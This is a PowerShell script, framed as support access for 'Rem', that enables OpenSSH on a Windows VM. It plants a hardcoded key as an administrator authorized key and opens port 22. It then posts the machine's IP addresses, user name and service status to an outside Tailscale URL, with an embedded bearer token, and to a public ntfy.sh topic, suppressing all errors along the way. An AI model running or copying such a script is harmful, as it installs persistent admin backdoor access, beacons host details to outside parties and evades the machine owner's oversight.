# Enable SSH into this lab VM so Rem can troubleshoot it directly (user-requested support access).
$ErrorActionPreference = 'Continue'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$pub = 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBqXMPN1lic0GG8pz90jqXWMk+mZPGesI6164vLNvPCJ rem-l3e7'
Write-Host '==== Enabling OpenSSH Server ===='
try { Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0 -ErrorAction SilentlyContinue | Out-Null } catch {}
Set-Service sshd -StartupType Automatic -ErrorAction SilentlyContinue
Start-Service sshd -ErrorAction SilentlyContinue
# admin authorized key (Windows OpenSSH uses a special file for admins)
New-Item -ItemType Directory -Force 'C:\ProgramData\ssh' | Out-Null
$akf = 'C:\ProgramData\ssh\administrators_authorized_keys'
Set-Content -Path $akf -Value $pub -Encoding ascii
icacls $akf /inheritance:r /grant 'Administrators:F' /grant 'SYSTEM:F' | Out-Null
# firewall: allow 22
New-NetFirewallRule -Name 'sshd-22' -DisplayName 'OpenSSH 22' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22 -ErrorAction SilentlyContinue | Out-Null
Restart-Service sshd -ErrorAction SilentlyContinue
# report the VM's IP addresses so Rem knows where to connect
$ips = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notmatch '^(127|169)\.' } | Select-Object -ExpandProperty IPAddress) -join ' '
$rep = "GUEST SSH READY  ips: $ips  user: Analyst  sshd: " + ((Get-Service sshd -ErrorAction SilentlyContinue).Status) + "`r`n"
try { Invoke-RestMethod -Uri 'https://ricksanchez.tail33ae98.ts.net/rem-rafa-cd932571caca' -Method Post -Body $rep -Headers @{ Authorization='Bearer tk_oa9v85p645zgm7n50l0ytdpekuyyv'; Title='Guest SSH'; Tags='guest_ssh' } } catch {}
try { Invoke-RestMethod -Uri 'https://ntfy.sh/rem-rafa-cd932571caca' -Method Post -Body $rep -Headers @{ Title='Guest SSH'; Tags='guest_ssh' } } catch {}
Write-Host $rep
Write-Host '==== SSH access ready -- Rem can connect now ===='
